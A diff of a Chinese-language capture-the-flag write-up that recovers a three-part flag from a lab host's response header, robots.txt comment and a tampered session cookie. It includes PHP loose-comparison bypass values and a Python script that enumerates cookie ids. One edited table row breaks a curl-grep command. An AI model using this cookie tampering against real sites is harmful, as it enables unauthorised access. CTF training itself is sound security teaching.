@@ -6,18 +6,14 @@
 | 题目 | seek flag |
 | 考点 | 三段式信息收集 / 响应头 / robots.txt / **Cookie 越权** |
 | flag | `flag{7ac5b3ca8737a70f029dc0ad71dadd11}` |
-| 状态 | ✅ 已通关 |
+| 状态 | 已通关 |
 | 原始记录 | [logs/2026-10-03.md](../../logs/2026-10-03.md) |
 
 > 相关笔记：[10 · 信息收集与代码审计 §1.7 / §1.8](../../notes/10-信息收集与代码审计.md)
 
----
-
 ## 一句话
 
 > flag 被**拆成三段**，分别藏在三个"开发者以为你看不到"的层面 —— **响应头、`robots.txt` 注释、以及一个改了就回的 Cookie**；题目本身没有任何漏洞利用，考的是**信息面要覆盖整个 HTTP 报文**，以及**看到 `Set-Cookie: id=0` 时敢不敢把它改成 `1`**。
-
----
 
 ## 一、flag 拆成三段
 
@@ -31,9 +27,7 @@
 
 **5 + 15 + 12 = 32** 位十六进制 —— 正好凑满平台标准 flag 格式（`flag{` + 32 位 hex + `}`）。
 
-> **⭐ 长度推导的价值**：拿到任何一片后，都要**反推总长度**。缺片段时能立刻知道"还差几位"，也能验证拼出来的顺序对不对（本题 `}` 在第三段末尾）。
-
----
+> **长度推导的价值**：拿到任何一片后，都要**反推总长度**。缺片段时能立刻知道"还差几位"，也能验证拼出来的顺序对不对（本题 `}` 在第三段末尾）。
 
 ## 二、逐段取得
 
@@ -57,7 +51,7 @@ curl -s $BASE/robots.txt
 #   User-agent: *  /  Disallow: /  /  #flag3:c0ad71dadd11}
 ```
 
-> **⚠️ 注意**：`robots.txt` 里 `Disallow: /` 往往是**模板噪音**（所有路径都 404），别在这上面死磕 —— **真正有价值的是注释行 `#`**。
+> **注意**：`robots.txt` 里 `Disallow: /` 往往是**模板噪音**（所有路径都 404），别在这上面死磕 —— **真正有价值的是注释行 `#`**。
 
 ### 2.3 flag1 · 响应体（需要 Cookie 越权）
 
@@ -78,7 +72,7 @@ curl -s -D - -o /dev/null $BASE/ | grep -i '^Flag2:'
 | 看响应头的姿势 | 命令 |
 |---|---|
 | curl（推荐，`-D -` 把头打到 stdout） | `curl -s -D - -o /dev/null "$URL"` |
-| 只筛 flag 类头 | `curl -s -D - -o /dev/null "$URL" \| grep -i '^Flag'` |
+| 只筛 flag 类头 | `curl -s -D - -o /dev/null "$URL" \ | grep -i '^Flag'` |
 | 浏览器 | F12 → Network → 点请求 → Response Headers |
 | 避免缓存 | `Shift+Ctrl+U` 无缓存刷新 |
 
@@ -92,8 +86,6 @@ python -c "print('flag{'+'7ac5b'+'3ca8737a70f029d'+'c0ad71dadd11'+'}')"
 | 顺序 | 依据 |
 |---|---|
 | flag1 → flag2 → flag3 | 三段顺序固定：**`}` 在第三段末尾**，说明 flag3 是最后一段 |
-
----
 
 ## 三、Cookie 越权
 
@@ -119,14 +111,14 @@ python -c "print('flag{'+'7ac5b'+'3ca8737a70f029d'+'c0ad71dadd11'+'}')"
 
 | 试的值 | 结果 | 原因 |
 |---|---|---|
-| `id=1` | ✅ 出 flag1 | 目标对象 |
-| `id=01` | ✅ 出 flag1 | PHP 弱类型 `if($id==1)`，`"01" == 1` 成立 |
-| `id=1.0` | ✅ 出 flag1 | 同上，`"1.0" == 1` 成立 |
-| `id=1e0` | ✅ 出 flag1 | 同上，科学计数法字符串也弱等于 `1` |
-| `ID=1`（**改大小写**） | ❌ 无效 | **Cookie 名大小写敏感** |
-| `flag=1`（**改参数名**） | ❌ 无效 | 参数名不对，服务端根本没读到 |
+| `id=1` | 出 flag1 | 目标对象 |
+| `id=01` | 出 flag1 | PHP 弱类型 `if($id==1)`，`"01" == 1` 成立 |
+| `id=1.0` | 出 flag1 | 同上，`"1.0" == 1` 成立 |
+| `id=1e0` | 出 flag1 | 同上，科学计数法字符串也弱等于 `1` |
+| `ID=1`（**改大小写**） | 无效 | **Cookie 名大小写敏感** |
+| `flag=1`（**改参数名**） | 无效 | 参数名不对，服务端根本没读到 |
 
-> **⭐ 两个结论**：
+> **两个结论**：
 > ① **值**可以"形变"（`01` / `1.0` / `1e0` 都是绕过弱比较的常见写法）；
 > ② **参数名**不行 —— 名字错 = 这个参数根本不存在。**别把"改值"和"改名"混为一谈。**
 
@@ -146,75 +138,21 @@ base_len = None
 for v in VALUES:
     r = requests.get(url, cookies={"id": v})
     if base_len is None: base_len = len(r.text)
-    flag = "⭐" if len(r.text) != base_len else ""
+    flag = "命中" if len(r.text) != base_len else ""
     print(f"id={v:6} -> {len(r.text)} bytes {flag}")
 # id=0    -> 346
-# id=1    -> 362 ⭐   ← 长度变了 = 有东西回显
+# id=1    -> 362   ← 长度变了 = 有东西回显
 ```
 
 **为什么盯长度**：`346 → 362`，**多出 16 字节**，而 flag1 片段是 `flag1:flag{7ac5b`（14 字符）+ 换行 ≈ 16 字节 —— **长度差就是"有东西回显"的铁证**。这比肉眼比对 HTML 快得多，也不会漏掉不可见字符。
 
-> **⚠️ 越权 ≠ 只改 Cookie**：URL 参数、POST 字段、请求头里出现 `id` / `user` / `role` 都是同一个考点。
+> **越权 ≠ 只改 Cookie**：URL 参数、POST 字段、请求头里出现 `id` / `user` / `role` 都是同一个考点。
 
----
 
-## 四、完整脚本
 
-### 4.1 三段三个命令（可直接复制）
+## 四、可复用方法论
 
-```bash
-BASE=http://<host>:8090
-
-# flag3
-curl -s $BASE/robots.txt
-#   User-agent: *  /  Disallow: /  /  #flag3:c0ad71dadd11}
-
-# flag1（改 Cookie 越权）
-curl -s -H "Cookie: id=1" $BASE/ | grep -o 'flag1:flag{[0-9a-f]*'
-#   ← <h1>…</h1>flag1:flag{7ac5b
-
-# flag2（响应头）
-curl -s -D - -o /dev/null $BASE/ | grep -i '^Flag2:'
-#   Flag2: 3ca8737a70f029d
-
-# 拼接
-python -c "print('flag{'+'7ac5b'+'3ca8737a70f029d'+'c0ad71dadd11'+'}')"
-#   flag{7ac5b3ca8737a70f029dc0ad71dadd11}
-```
-
-### 4.2 一把梭（Python，自动三段 + 校验长度）
-
-```python
-import re, requests
-
-BASE = "http://<host>:8090"
-
-# flag3: robots.txt 注释（Disallow: / 是模板噪音，只取 # 后面的）
-robots = requests.get(BASE + "/robots.txt").text
-flag3 = re.search(r"#flag3:([0-9a-f}]+)", robots).group(1).rstrip("}")
-
-# flag1: 响应体，需要 Cookie 越权 id=1
-body = requests.get(BASE + "/", cookies={"id": "1"}).text
-flag1 = re.search(r"flag1:flag\{([0-9a-f]+)", body).group(1)
-
-# flag2: 响应头
-head = requests.get(BASE + "/").headers
-flag2 = head["Flag2"].strip()
-
-flag = "flag{%s%s%s}" % (flag1, flag2, flag3)
-print(flag1, flag2, flag3)
-assert len(flag1) + len(flag2) + len(flag3) == 32, "三段长度不对，检查是否漏段"
-print(flag)
-# flag{7ac5b3ca8737a70f029dc0ad71dadd11}
-```
-
-> **`assert ... == 32` 这行很有用**：三段齐不齐、顺序对不对，靠长度一眼就能判定。
-
----
-
-## 五、可复用方法论
-
-### 5.1 信息面清单（每题开局都按这个扫）
+### 4.1 信息面清单（每题开局都按这个扫）
 
 ```
 ① 响应头（-D -）：Flag / X-Flag / 自定义头 / Set-Cookie
@@ -224,13 +162,13 @@ print(flag)
 ⑤ 前端 JS：接口路径、硬编码字符串
 ```
 
-### 5.2 ⭐ 看到"不完整"的 flag 就要想到分段
+### 4.2 看到"不完整"的 flag 就要想到分段
 
 - 平台 flag 长度**基本都是固定的**（本题 32 位 hex）→ **先数字符**；
 - 不够长 = **还有片段没找到**，不是"这道题 flag 就是这样"；
 - 找到的每段都记下**位置 + 长度**，拼之前先验长度和。
 
-### 5.3 Cookie 越权通用流程
+### 4.3 Cookie 越权通用流程
 
 ```
 ① 找身份参数：Cookie / URL / POST 里的 id、uid、role、admin、level
@@ -239,13 +177,13 @@ print(flag)
 ④ 值可以形变（01 / 1.0 / 1e0），名字不能改（大小写敏感）
 ```
 
-### 5.4 两条通用教训
+### 4.4 两条通用教训
 
 > **①「没反应」是多义的** —— 参数没进去 / 分支走错 / 值不对 / 名字不对。必须靠**基线对照** + **可验证中间量（响应长度、Content-Length）**定位。
 >
 > **② 试一个值没反应 ≠ 这条路不通** —— `id=2` / `id=9` 没回显就放弃，是本题最容易犯的错；**照候选表穷举，看响应长度变化**。
 
-### 5.5 踩坑
+### 4.5 踩坑
 
 | 问题 | 原因 | 解决 |
 |---|---|---|
